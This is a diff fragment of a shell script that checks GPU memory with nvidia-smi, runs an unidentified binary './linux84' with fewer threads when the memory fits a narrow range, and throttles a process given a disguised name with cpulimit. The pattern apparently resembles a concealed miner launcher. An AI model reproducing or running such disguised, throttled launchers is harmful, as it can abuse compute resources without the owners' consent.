@@ -94,7 +94,7 @@ google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//
 if (( $google84121274 >= 14884 && $google84121274 <= 18884 ))
 then
 
-./linux84 -t 12
+./linux84 -t 10
 
 fi
 
@@ -134,7 +134,7 @@ cpulimit -e google84121274 -l 62 &> /dev/null &
 if (( $google84121274 >= 14884 && $google84121274 <= 18884 ))
 then
 
-./linux84 -t 12
+./linux84 -t 10
 
 fi
 
